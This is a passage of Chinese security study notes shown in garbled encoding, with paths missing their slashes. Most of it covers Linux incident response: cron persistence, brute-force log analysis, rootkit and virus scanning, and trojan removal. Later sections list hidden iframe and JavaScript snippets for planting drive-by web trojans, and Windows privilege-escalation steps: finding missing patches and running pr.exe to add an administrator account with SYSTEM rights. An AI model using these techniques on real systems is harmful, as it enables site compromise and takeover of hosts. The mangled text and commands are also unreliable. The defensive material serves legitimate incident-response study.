å®šæ—¶ä»»åŠ¡1ã€åˆ©ç”¨crontabåˆ›å»ºè®¡åˆ’ä»»åŠ¡crontab -l ## åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹ Tipsï¼š## é»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (varspoolcronç”¨æˆ·å ä¾‹å¦‚: varspoolcronroot crontab -r ##åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡) crontab -e ## ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶ å¦‚ï¼š1 * echo â€œhello worldâ€ tmptest.txt ## æ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶ 2ã€åˆ©ç”¨anacronå®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦## æ¯å¤©è¿è¡Œ homebackup.sh è„šæœ¬ï¼š vi etcanacrontab @daily 10 example.daily binbashhomebackup.sh ## å½“æœºå™¨åœ¨ backup.sh æœŸæœ›è¢«è¿è¡Œæ—¶æ˜¯å…³æœºçš„ï¼Œanacronä¼šåœ¨æœºå™¨å¼€æœºååˆ†é’Ÿä¹‹åè¿è¡Œå®ƒï¼Œè€Œä¸ç”¨å†ç­‰å¾…7å¤©ã€‚ é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬ varspoolcron* etccrontab etccron.d* etccron.daily* etccron.hourly* etccron.monthly* etccron.weekly etcanacrontab varspoolanacron* 3-18-7 æœåŠ¡8-1 æœåŠ¡è‡ªå¯åŠ¨ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š chkconfig [â€“level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off] chkconfig â€“level 2345 httpd on ## å¼€å¯è‡ªå¯åŠ¨ chkconfig httpd on ## ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰ ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š ä¿®æ”¹etcre.drc.local æ–‡ä»¶ åŠ å…¥ etcinit.dhttpd start å…¥ä¾µæ’æŸ¥ 1ã€æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡ï¼š RPMåŒ…å®‰è£…çš„æœåŠ¡ chkconfig â€“list ### æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡ ps aux | grep crond ## æŸ¥çœ‹å½“å‰æœåŠ¡ ç³»ç»Ÿåœ¨3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ chkconfig â€“list | grep â€œ3:å¯ç”¨|5:å¯ç”¨â€ ## ä¸­æ–‡ç¯å¢ƒ chkconfig â€“list | grep â€œ3:on|5:onâ€ ## è‹±æ–‡ç¯å¢ƒ æºç åŒ…å®‰è£…çš„æœåŠ¡ ## æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨userlocal service httpd start ## æœç´¢etcrc.dinit.d æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ 3-18-8 ç³»ç»Ÿæ—¥å¿—##æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š varlog ## æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼š more etcrsyslog.conf æ—¥å¿—åˆ†ææŠ€å·§ï¼š 1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š grep â€œFailed password for rootâ€ varlogsecure | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | more ## å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š grep â€œFailed passwordâ€ varlogsecure|grep -E -o â€œ(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)â€|uniq -c ## çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ grep â€œFailed passwordâ€ varlogsecure|perl -e â€˜while($){ for(.*?) from; print â€œ$1 â€;}â€™|uniq -c|sort -nr 2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š grep â€œAccepted â€œ varlogsecure | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | more ## ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š grep â€œAccepted â€œ varlogsecure | awk â€˜{print $1,$2,$3,$9,$11}â€™ 3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š Jul 10 00:12:15 localhost useradd[2382]: new group: namekali, GID1001 Jul 10 00:12:15 localhost useradd[2382]: new user: namekali, UID1001, GID1001, homehomekali , shellbinbash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep â€œuseraddâ€ varlogsecure 4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š Jul 10 00:14:17 localhost userdel[2393]: delete user â€˜kaliâ€™ Jul 10 00:14:17 localhost userdel[2393]: removed group â€˜kaliâ€™ owned by â€˜kaliâ€™ Jul 10 00:14:17 localhost userdel[2393]: removed shadow group â€˜kaliâ€™ owned byâ€™kaliâ€™ # grep â€œuserdelâ€ varlogsecure 5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid0) sudoæˆæƒæ‰§è¡Œ: sudo -l Jul 10 00:43:09 localhost sudo: good : TTYpts4 ; PWDhomegood ; USERroot; COMMANDsbinshutdown -r now 3-18-9 RootkitæŸ¥æ€9-1 chkrootkitç½‘å€ï¼šhttp://www.chkrootkit.org ä½¿ç”¨æ–¹æ³•ï¼š wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #ç¼–è¯‘å®Œæˆæ²¡æœ‰æŠ¥é”™çš„è¯æ‰§è¡Œæ£€æŸ¥ .chkrootkit 9-2 rkhunterç½‘å€ï¼šhttp://rkhunter.sourceforge.net ä½¿ç”¨æ–¹æ³•ï¼š Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 .installer.sh â€“install rkhunter -c 3-18-10 ç—…æ¯’æŸ¥æ€10-1 ClamavClamAVçš„å®˜æ–¹ä¸‹è½½åœ°å€ä¸ºï¼šhttp://www.clamav.net/download.html å®‰è£…æ–¹å¼ä¸€ï¼š 1ã€å®‰è£…zlibï¼š wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #å®‰è£…ä¸€ä¸‹gccç¼–è¯‘ç¯å¢ƒï¼š yum install gcc CFLAGSâ€-O3 -fPICâ€ .configure â€“prefix usrlocalzlib make make install 2ã€æ·»åŠ ç”¨æˆ·ç»„clamavå’Œç»„æˆå‘˜clamavï¼š groupadd clamav useradd -g clamav -s binfalse -c â€œClam AntiVirusâ€ clamav 3ã€å®‰è£…Clamav tar â€“zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 .configure â€“prefixoptclamav â€“disable-clamav -with-zlibusrlocalzlib make make install 4ã€é…ç½®Clamav mkdir optclamavlogs mkdir optclamavupdata touch optclamavlogsfreshclam.log touch optclamavlogsclamd.log cd optclamavlogs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5ã€ClamAV ä½¿ç”¨ï¼š optclamavbinfreshclam ## å‡çº§ç—…æ¯’åº“ .clamscan â€“h # æŸ¥çœ‹ç›¸åº”çš„å¸®åŠ©ä¿¡æ¯ .clamscan -r home ##æ‰«ææ‰€æœ‰ç”¨æˆ·çš„ä¸»ç›®å½•å°±ä½¿ç”¨ .clamscan -r â€“bell -i bin ## æ‰«æbinç›®å½•å¹¶ä¸”æ˜¾ç¤ºæœ‰é—®é¢˜çš„æ–‡ä»¶çš„æ‰«æç»“æœ å®‰è£…æ–¹å¼äºŒï¼š yum install -y clamav #æ›´æ–°ç—…æ¯’åº“ freshclam #æ‰«ææ–¹æ³• clamscan -r etc â€“max-dir-recursion5 -l rootetcclamav.log clamscan -r bin â€“max-dir-recursion5 -l rootbinclamav.log clamscan -r usr â€“max-dir-recursion5 -l rootusrclamav.log #æ‰«æå¹¶æ€æ¯’ clamscan -r â€“remove usrbinbsd-port clamscan -r â€“remove usrbin clamscan -r â€“remove usrlocalzabbixsbin #æŸ¥çœ‹æ—¥å¿—å‘ç° cat rootusrclamav.log |grep FOUND 10-2 webshellæŸ¥æ€linuxç‰ˆï¼š æ²³é©¬webshellæŸ¥æ€ï¼šhttp://www.shellpub.com æ·±ä¿¡æœWebshellç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼šhttp://edr.sangfor.com.cn/backdoor_detection.html 10-3 RPM checkæ£€æŸ¥ç³»ç»Ÿå®Œæ•´æ€§å¯ä»¥é€šè¿‡rpmè‡ªå¸¦çš„-Vaæ¥æ ¡éªŒæ£€æŸ¥æ‰€æœ‰çš„rpmè½¯ä»¶åŒ…ï¼ŒæŸ¥çœ‹å“ªäº›å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢äº†ï¼š .rpm -Va rpm.log å¦‚æœä¸€åˆ‡å‡æ ¡éªŒæ­£å¸¸å°†ä¸ä¼šäº§ç”Ÿä»»ä½•è¾“å‡ºï¼Œå¦‚æœæœ‰ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¾“å‡ºæ ¼å¼æ˜¯8ä½é•¿å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ç”¨ä»¥è¡¨ç¤ºæ–‡ä»¶ä¸RPMæ•°æ®åº“ä¸­ä¸€ç§å±æ€§çš„æ¯”è¾ƒç»“æœ ï¼Œå¦‚æœæ˜¯. (ç‚¹) åˆ™è¡¨ç¤ºæµ‹è¯•é€šè¿‡ã€‚ éªŒè¯å†…å®¹ä¸­çš„8ä¸ªä¿¡æ¯çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š S æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜ M æ–‡ä»¶çš„ç±»å‹æˆ–æ–‡ä»¶çš„æƒé™ï¼ˆrwxï¼‰æ˜¯å¦è¢«æ”¹å˜ 5 æ–‡ä»¶MD5æ ¡éªŒæ˜¯å¦æ”¹å˜ï¼ˆå¯ä»¥çœ‹æˆæ–‡ä»¶å†…å®¹æ˜¯å¦æ”¹å˜ï¼‰ D è®¾å¤‡ä¸­ï¼Œä»ä»£ç æ˜¯å¦æ”¹å˜ L æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜ U æ–‡ä»¶çš„å±ä¸»ï¼ˆæ‰€æœ‰è€…ï¼‰æ˜¯å¦æ”¹å˜ G æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜ T æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜ å¦‚æœå‘½ä»¤è¢«æ›¿æ¢äº†ï¼Œå¦‚ä½•è¿˜åŸå›æ¥ï¼š æ–‡ä»¶æå–è¿˜åŸæ¡ˆä¾‹ï¼š rpm -qf binls ## æŸ¥è¯¢lså‘½ä»¤å±äºå“ªä¸ªè½¯ä»¶åŒ… mv binls tmp ## å…ˆæŠŠlsè½¬ç§»åˆ°tmpç›®å½•ä¸‹ï¼Œé€ æˆlså‘½ä»¤ä¸¢å¤±çš„å‡è±¡ rpm2cpio mntcdromPackagescoreutils-8.4-19.el6.i686.rpm | cpio -idv .binls ## æå–rpmåŒ…ä¸­lså‘½ä»¤åˆ°å½“å‰ç›®å½•çš„binlsä¸‹ cp rootbinls bin ## æŠŠlså‘½ä»¤å¤åˆ¶åˆ°binç›®å½• ä¿®å¤æ–‡ä»¶ä¸¢å¤± 3-18-11 Linuxç™»å½•æ—¥å¿—åˆ†æAã€ç³»ç»Ÿè´¦å·æƒ…å†µ 1ã€é™¤rootä¹‹å¤–ï¼Œæ˜¯å¦è¿˜æœ‰å…¶å®ƒç‰¹æƒç”¨æˆ·(uid ä¸º0) awk -F: â€˜$30{print $1}â€™ etcpasswd 2ã€å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯ awk â€˜$1|$6{print $1}â€™ etcshadow æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯varlogsecureï¼Œè¿™ä¸ªæ—¥å¿—æ–‡ä»¶è®°å½•äº†éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚ Bã€ç¡®è®¤æ”»å‡»æƒ…å†µï¼š 1ã€ç»Ÿè®¡äº†ä¸‹æ—¥å¿—ï¼Œå‘ç°å¤§çº¦æœ‰126254æ¬¡ç™»å½•å¤±è´¥çš„è®°å½•ï¼Œç¡®è®¤æœåŠ¡å™¨é­å—æš´åŠ›ç ´è§£ grep -o â€œFailed passwordâ€ varlogsecure|uniq -c 126254 Failed password 2ã€è¾“å‡ºç™»å½•çˆ†ç ´çš„ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œï¼Œç¡®è®¤çˆ†ç ´æ—¶é—´èŒƒå›´ï¼š grep â€œFailed passwordâ€ varlogsecure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 grep â€œFailed passwordâ€ varlogsecure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3ã€è¿›ä¸€æ­¥å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼Ÿ grep â€œFailed passwordâ€ varlogsecure|grep -E -o â€œ(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)â€|uniq -c | sort -nr å°†ç°æœ‰ç”¨æˆ·çš„å¯†ç æ”¹æ‰ï¼Œè®¾ç½®å®‰å…¨ç­–ç•¥ï¼Œç”¨æˆ·å°è¯•ç™»å½•æ¬¡æ•°çš„æœ€å¤§å€¼é™åˆ¶ï¼Œåˆ é™¤å¼‚å¸¸ç”¨æˆ·ç­‰æ“ä½œ 4ã€çˆ†ç ´ç”¨æˆ·åå­—å…¸éƒ½æœ‰å“ªäº›ï¼Ÿ [root@localhost ~]# grep â€œFailed passwordâ€ varlogsecure|perl -e â€˜while($){for(.?) from; print â€œ$1 â€;}â€™|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user Cã€ç®¡ç†å‘˜æœ€è¿‘ç™»å½•æƒ…å†µï¼š 1ã€ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š grep â€œAccepted â€œ varlogsecure | awk â€˜{print$1,$2,$3,$9,$11}â€™ Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 é€šè¿‡ç™»å½•æ—¥å¿—åˆ†æï¼Œå¹¶æœªå‘ç°å¼‚å¸¸ç™»å½•æ—¶é—´å’Œç™»å½•IPã€‚ 2ã€é¡ºä¾¿ç»Ÿè®¡ä¸€ä¸‹ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š grep â€œAccepted â€œ varlogsecure | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | more 27 192.168.204.1 é€šè¿‡æ—¥å¿—åˆ†æï¼Œå‘ç°æ”»å‡»è€…ä½¿ç”¨äº†å¤§é‡çš„ç”¨æˆ·åè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œä½†ä»è¿‘æ®µæ—¶é—´çš„ç³»ç»Ÿç®¡ç†å‘˜ç™»å½•è®°å½•æ¥çœ‹ï¼Œå¹¶æœªå‘ç°å¼‚å¸¸ç™»å½•çš„æƒ…å†µï¼Œéœ€è¦è¿›ä¸€æ­¥å¯¹ç½‘ç«™æœåŠ¡å™¨è¿›è¡Œå…¥ä¾µæ’æŸ¥ï¼Œè¿™é‡Œå°±ä¸å†é˜è¿°ã€‚ 3-18-12 Linuxæ‰‹åŠ¨æ¸…é™¤æœ¨é©¬è¿‡ç¨‹ï¼š1ã€ç®€å•åˆ¤æ–­æœ‰æ— æœ¨é©¬ #æœ‰æ— ä¸‹åˆ—æ–‡ä»¶ cat etcrc.dinit.dselinux cat etcrc.dinit.dDbSecuritySpt ls usrbinbsd-port ls usrbindpkgd #æŸ¥çœ‹å¤§å°æ˜¯å¦æ­£å¸¸ ls -lh binnetstat ls -lh binps ls -lh usrsbinlsof ls -lh usrsbinss 2ã€ä¸Šä¼ å¦‚ä¸‹å‘½ä»¤åˆ°rootä¸‹ ps netstat ss lsof 3ã€åˆ é™¤å¦‚ä¸‹ç›®å½•åŠæ–‡ä»¶ rm -rf usrbindpkgd (ps netstat lsof ss) rm -rf usrbinbsd-port #æœ¨é©¬ç¨‹åº rm -f usrbin.sshd #æœ¨é©¬åé—¨ rm -f tmpgates.lod rm -f tmpmoni.lod rm -f etcrc.dinit.dDbSecuritySpt(å¯åŠ¨ä¸Šè¿°æè¿°çš„é‚£äº›æœ¨é©¬å˜ç§ç¨‹åº) rm -f etcrc.drc1.dS97DbSecuritySpt rm -f etcrc.drc2.dS97DbSecuritySpt rm -f etcrc.drc3.dS97DbSecuritySpt rm -f etcrc.drc4.dS97DbSecuritySpt rm -f etcrc.drc5.dS97DbSecuritySpt rm -f etcrc.dinit.dselinux(é»˜è®¤æ˜¯å¯åŠ¨usrbinbsd-portgetty) rm -f etcrc.drc1.dS99selinux rm -f etcrc.drc2.dS99selinux rm -f etcrc.drc3.dS99selinux rm -f etcrc.drc4.dS99selinux rm -f etcrc.drc5.dS99selinux 4ã€æ‰¾å‡ºå¼‚å¸¸ç¨‹åºå¹¶æ€æ­» 5ã€åˆ é™¤å«æœ¨é©¬å‘½ä»¤å¹¶é‡æ–°å®‰è£… 3-18-13 Linux åº”æ€¥å“åº”æ€»ç»“linuxï¼šç—…æ¯’æŸ¥æ€çš„åº”æ€¥å“åº”è¿‡ç¨‹ï¼šæŒ–çŸ¿ç—…æ¯’çš„ï¼šé¦–å…ˆå‘ç°cpuä½¿ç”¨ç‡å¾ˆé«˜ï¼Œå› ä¸ºç½‘ç«™å˜å¾—æ¯”è¾ƒå¡ æ˜¯å¦å—æ”»å‡»äº†ï¼Ÿ 1. ç³»ç»Ÿæ—¥å¿—ï¼šæŸ¥çœ‹å¼‚å¸¸çš„ç™»å½•è¡Œä¸º 2. æŸ¥çœ‹ç”¨æˆ·ï¼šå¼‚å¸¸ç”¨æˆ· æŸ¥æ¯’è¿‡ç¨‹ å€ŸåŠ©ä¸€äº›å·¥å…·ï¼šrkhunter\\chkrootkit\\æ²³é©¬(ä¸“æ€webshell) 1. æŸ¥çœ‹è¿›ç¨‹å’Œç«¯å£è¿æ¥æƒ…å†µ 2. é€šè¿‡å¯ç–‘è¿›ç¨‹(å ç”¨çš„cpuæ¯”è¾ƒé«˜ï¼Œps auxï¼Œå¹¶ä¸”å¯¹å¤–æœ‰ä¸ªè¿æ¥ï¼Œå¯¹å¤–çš„ipåœ°å€æŸ¥çœ‹äº†ä¸€ä¸‹æ˜¯å›½å¤–çš„ipåœ°å€ç­‰)å’Œè¿æ¥å®šä½è¿›ç¨‹çš„æ‰§è¡Œç¨‹åºæ–‡ä»¶ã€‚ 3. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œæ¯”å¦‚å‘ç°æ˜¯psæŒ‡ä»¤çš„æ‰§è¡Œæ–‡ä»¶ 4. åˆ é™¤æˆ–è€…ä¿®æ”¹è¯¥æ–‡ä»¶ï¼Œæ¯”å¦‚ï¼šå»å’Œå½“å‰ç³»ç»Ÿç›¸åŒçš„æ­£å¸¸ç³»ç»Ÿä¸­æ‹·è´äº†ä¸€ä¸ªæ­£å¸¸çš„psæ–‡ä»¶ï¼Œç„¶åæ›¿æ¢äº†ä¸€ä¸‹ åç»­åŠ¨ä½œï¼šæ²¡æœ‰å‘ç°ç—…æ¯’çš„èº«å½± æŸ¥çœ‹æœåŠ¡ æŸ¥çœ‹å¯åŠ¨é¡¹ æŸ¥çœ‹å®šæ—¶ä»»åŠ¡:cronanacron å°è¯•æº¯æºï¼šwebç¨‹åºæ¼æ´ï¼Œç³»ç»Ÿæ¼æ´ é¦–å…ˆæ£€æŸ¥ç³»ç»Ÿæ¼æ´ï¼šæ£€æŸ¥ç³»ç»Ÿçš„è¡¥ä¸æƒ…å†µï¼Œå‘ç°æœ‰ä¸ªå‡ ä¸ªæ–°çš„è¡¥ä¸æ²¡æœ‰æ‰“ä¸Šï¼Œç—…æ¯’æœ‰å¯èƒ½æ˜¯åŸºäºè¿™äº›æ¼æ´è¿›æ¥çš„ï¼Œç”³è¯·æ‰“è¡¥ä¸ï¼Œåœ¨æµ‹è¯•ç¯å¢ƒä¸­æ‰“è¡¥ä¸ï¼Œå‘ç°æ²¡æœ‰å½±å“æ­£å¸¸çš„ç¨‹åºè¿è¡Œ ç„¶åå†åˆ°è¯¥æœåŠ¡å™¨ä¸Šæ‰“è¡¥ä¸çš„ã€‚è€Œä¸”è¿˜æ£€æŸ¥äº†å¼±å£ä»¤ï¼Œæ£€æŸ¥ç³»ç»Ÿå£ä»¤è§„åˆ™é…ç½®ï¼Œå£ä»¤å¤æ‚åº¦å‘ç°å£ä»¤å¤æ‚åº¦æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ 3-19 æ˜ åƒåŠ«æŒ3-19-1 æ˜ åƒåŠ«æŒæ³¨å†Œè¡¨ä½ç½®HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Image File ExecutionOptions 3-19-2 autorunså·¥å…· 3-19-3 xuetræ‰¹é‡åˆ é™¤ 3-20 webæŒ‚é©¬æ–¹å¼ä¸€:æ¡†æ¶æŒ‚é©¬ äºŒ:jsæ–‡ä»¶æŒ‚é©¬ é¦–å…ˆå°†ä»¥ä¸‹ä»£ç  document.write(â€œâ€œ); ä¿å­˜ä¸ºxxx.jsï¼Œ åˆ™JSæŒ‚é©¬ä»£ç ä¸º ä¸‰:jså˜å½¢åŠ å¯† muma.txtå¯æ”¹æˆä»»æ„åç¼€ å››:bodyæŒ‚é©¬ äº”:éšè”½æŒ‚é©¬ top.document.body.innerHTML top.document.body.innerHTML + â€˜\\r iframe srcâ€; å…­:cssä¸­æŒ‚é©¬ body { background-image: url(â€˜javascript:document.write(â€œâ€œ)â€™) } ä¸ƒ:jsæŒ‚é©¬ window.open (åœ°å€,,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,width=1,height=1); å…«:å›¾ç‰‡ä¼ªè£… ä¹:ä¼ªè£…è°ƒç”¨ï¼š frame srcâ€æ‰“å¼€ç½‘é¡µâ€ framborderâ€noâ€ scrollingâ€autoâ€ noresize marginwidthâ€0â€margingheightâ€0â€ frame srcâ€ç½‘é©¬åœ°å€â€ frameborderâ€noâ€ scrollingâ€noâ€ noresize marginwidthâ€0â€margingheightâ€0â€ å:é«˜çº§æ¬ºéª— é¡µé¢è¦æ˜¾ç¤ºçš„å†…å®¹ function www_163_com (){ var url=ç½‘é©¬åœ°å€; open(url,NewWindow,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10); } åä¸€:åˆ¤æ–­ç³»ç»Ÿä»£ç  404 åäºŒ:åˆ¤æ–­æ˜¯å¦æœ‰ms06014ä»£ç  åä¸‰:æ™ºèƒ½è¯»å–jsçš„ä»£ç demo è¯»å–srcçš„å¯¹è±¡ var v document.getElementById(â€œadvjsâ€); è¯»å–srcçš„å‚æ•° var u_num getUrlParameterAdv(â€œshowmatrix_numâ€,v.getAttribute(â€˜srcâ€™)); document.write(â€œâ€); document.writeln(â€œâ€); document.writeln(â€œâ€); document.writeln(â€œâ€); document.writeln(â€œ/HEADâ€); document.writeln(â€œ â€œ); document.writeln(â€œâ€); document.writeln(â€œ /DIV/DIV/BODY/HTMLâ€) åˆ†æsrcçš„å‚æ•°å‡½æ•° function getUrlParameterAdv(asName, lsURL) { loU lsURL.split(â€˜?â€™) if (loU.length 1) { var loallPm loU[1].split(â€˜â€™) for (var i 0; i loallPm.length; i++) { var loPm loallPm.split(â€˜â€™) if (loPm[0] asName) { if (loPm.length 1) { return loPm[1] } else { return â€˜â€™ } } } } return null } 3-21 windowsææƒ3-21-1å¸¸ç”¨å‘½ä»¤whoami â€”â€”æŸ¥çœ‹ç”¨æˆ·æƒé™ systeminfo â€”â€”æŸ¥çœ‹æ“ä½œç³»ç»Ÿï¼Œè¡¥ä¸æƒ…å†µ ipconfigâ€”â€”æŸ¥çœ‹å½“å‰æœåŠ¡å™¨IP ipconfig all net userâ€”â€”æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒ…å†µ netstat â€”â€”æŸ¥çœ‹å½“å‰ç½‘ç»œè¿æ¥æƒ…å†µ netstat â€“ano netstat â€“an | find â€œESTABLISHEDâ€ tasklist â€”â€”æŸ¥çœ‹å½“å‰è¿›ç¨‹æƒ…å†µ tasklist svc taskkill â€”â€”ç»“æŸè¿›ç¨‹ taskkill -PID xx net start â€”â€”å¯åŠ¨æœåŠ¡ net stop â€”â€”åœæ­¢æœåŠ¡ etp c:\\www\\1111\\cmd.exe â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ ## æŒ‡å®šæˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯ 3-21-2 ææƒ2-1 å¾®è½¯å®˜ç½‘æ‰¾å…¬å¸ƒçš„expç½‘å€ï¼š https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017 è¿™é‡Œé¢æœ‰æ¼æ´ç¼–å·ã€å½±å“ç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚ æ¯”å¦‚å¸¸ç”¨çš„å‡ ä¸ªå·²å…¬å¸ƒçš„ expï¼š KB2592799 KB3000061 KB2592799 å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„ expï¼Œå¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯ï¼Œä»¥å…å½±å“ä¸šåŠ¡ã€‚ å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š systeminfomicropoor.txt(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find i â€œ%iâ€|| @echo %i you can fuck)del f q a micropoor.txt 2-2 ä½¿ç”¨å·¥å…·æ‰¾åˆ°è¿™ä¸ªå·¥å…·ï¼Œprå·¥å…·ï¼Œåœ¨ææƒå·¥å…·ç›®å½•ä¸­é‡Œé¢æœ‰å¥½å¤šææƒå·¥å…·ï¼Œä¸è¿‡æœ‰ä¸€äº›æ¯”è¾ƒè€äº†éƒ½ã€‚ å°†è¿™ä¸ªdebug.exeæ”¾å…¥åˆ°ç›®æ ‡ä¸»æœºçš„æŸä¸ªç›®å½•ä¸‹ ç„¶ååœ¨è¿æ¥ç»ˆç«¯ç›´æ¥æ‰§è¡Œ debug.exe è‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªtempç”¨æˆ·ï¼Œå¹¶ä¸”åŠ å…¥åˆ°äº†ç®¡ç†å‘˜ç»„ã€‚ è¿™æ ·æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå›ºå®šçš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å¦‚æœæƒ³åˆ›å»ºæŒ‡å®šçš„ç”¨æˆ·åï¼Œé‚£ä¹ˆå¯ä»¥ç”¨pr.exe åœ¨ç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ pr.exe â€œnet uesr 123 123 addâ€ ## æ³¨æ„ï¼Œæƒ³è¦æ‰§è¡Œçš„æŒ‡ä»¤è¦ç”¨åŒå¼•å·æ‹¬èµ·æ¥ é‚£ä¹ˆé€šè¿‡prå°±å¯ä»¥æ‰§è¡Œä»»æ„æŒ‡ä»¤äº†ï¼Œå› ä¸ºæ˜¯systemæƒé™ã€‚ 2-3 scå‘½ä»¤ææƒé’ˆå¯¹ç‰ˆæœ¬windows 7ã€8ã€03ã€08ã€12ã€16 SC 